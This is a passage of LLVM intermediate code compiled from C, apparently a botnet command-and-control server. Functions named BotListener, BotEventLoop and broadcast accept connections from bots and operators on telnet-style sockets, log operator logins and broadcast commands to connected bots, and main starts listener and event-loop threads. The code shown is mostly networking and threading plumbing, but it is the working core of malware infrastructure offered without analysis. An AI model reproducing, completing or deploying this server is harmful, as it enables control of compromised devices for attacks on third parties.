  %858 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.105, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i64 0, i64 0))
  store %struct._IO_FILE* %858, %struct._IO_FILE** %56, align 8
  %859 = call i64 @time(i64* noundef null) #9
  store i64 %859, i64* %57, align 8
  %860 = call %struct.tm* @gmtime(i64* noundef %57) #9
  store %struct.tm* %860, %struct.tm** %58, align 8
  %861 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i64 0, i64 0
  %862 = load %struct.tm*, %struct.tm** %58, align 8
  %863 = call i64 @strftime(i8* noundef %861, i64 noundef 50, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i64 0, i64 0), %struct.tm* noundef %862) #9
  %864 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %865 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i64 0, i64 0
  %866 = load i32, i32* %5, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %867
  %869 = getelementptr inbounds %struct.login_info, %struct.login_info* %868, i32 0, i32 0
  %870 = getelementptr inbounds [20 x i8], [20 x i8]* %869, i64 0, i64 0
  %871 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %872 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %864, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i64 0, i64 0), i8* noundef %865, i8* noundef %870, i8* noundef %871)
  %873 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %874 = call i32 @fclose(%struct._IO_FILE* noundef %873)
  %875 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %876 = load i32, i32* %4, align 4
  %877 = load i32, i32* %5, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %878
  %880 = getelementptr inbounds %struct.login_info, %struct.login_info* %879, i32 0, i32 0
  %881 = getelementptr inbounds [20 x i8], [20 x i8]* %880, i64 0, i64 0
  call void @broadcast(i8* noundef %875, i32 noundef %876, i8* noundef %881)
  %882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %882, i8 0, i64 2048, i1 false)
  br label %289, !llvm.loop !19

883:                                              ; preds = %289
  br label %884

884:                                              ; preds = %883, %844, %837, %836, %814, %809, %800, %792, %784, %776, %768, %760, %752, %744, %736, %720, %702, %694, %686, %678, %670, %662, %654, %646, %638, %630, %622, %614, %606, %598, %590, %582, %574, %566, %558, %550, %542, %534, %526, %518, %510, %280, %275, %266, %258, %250, %242, %234, %226, %218, %210, %173, %172, %162, %143, %137, %112, %106
  %885 = load i32, i32* %4, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %886
  %888 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %887, i32 0, i32 0
  store i32 0, i32* %888, align 4
  %889 = load i32, i32* %4, align 4
  %890 = call i32 @close(i32 noundef %889)
  %891 = load volatile i32, i32* @OperatorsConnected, align 4
  %892 = add nsw i32 %891, -1
  store volatile i32 %892, i32* @OperatorsConnected, align 4
  br label %893

893:                                              ; preds = %884, %355, %343, %326, %309
  %894 = load i8*, i8** %2, align 8
  ret i8* %894
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* noundef) #3

declare i32 @fgetc(%struct._IO_FILE* noundef) #1

declare void @rewind(%struct._IO_FILE* noundef) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE* noundef, i8* noundef, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64* noundef, %union.pthread_attr_t* noundef, i8* (i8*)* noundef, i8* noundef) #3

declare i32 @system(i8* noundef) #1

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64* noundef) #3

; Function Attrs: nounwind
declare i64 @strftime(i8* noundef, i64 noundef, i8* noundef, %struct.tm* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @BotListener(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 noundef zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 noundef %22, %struct.sockaddr* noundef %23, i32 noundef 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.110, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 noundef %28, i32 noundef 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %37, %27
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 noundef %31, %struct.sockaddr* noundef %32, i32* noundef %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* noundef %8, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @BotWorker, i8* noundef %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare i32 @listen(i32 noundef, i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1, i8** noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %18, i8* noundef getelementptr inbounds ([39 x i8], [39 x i8]* @.str.112, i64 0, i64 0), i8* noundef %21)
  call void @exit(i32 noundef 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* noundef %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* noundef %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* noundef %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 noundef %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 noundef %47, i32 noundef 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 noundef 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 noundef %62, i32 noundef 1, i32 noundef %63, %struct.epoll_event* noundef %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* noundef %82, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @BotEventLoop, i8* noundef null) #9
  br label %74, !llvm.loop !20

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* noundef %85, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* noundef %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 noundef -1, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i64 0, i64 0))
  %92 = call i32 @sleep(i32 noundef 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @create_and_bind(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* noundef null, i8* noundef %14, %struct.addrinfo* noundef %4, %struct.addrinfo** noundef %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 noundef %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %19, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.119, i64 0, i64 0), i8* noundef %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 noundef %31, i32 noundef %34, i32 noundef %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 noundef %43, i32 noundef 1, i32 noundef 2, i8* noundef %44, i32 noundef 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 noundef %49, %struct.sockaddr* noundef %52, i32 noundef %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 noundef %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %71, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.121, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* noundef %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32 noundef) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8* noundef, i8* noundef, %struct.addrinfo* noundef, %struct.addrinfo** noundef) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo* noundef) #3

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.ident = !{!0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
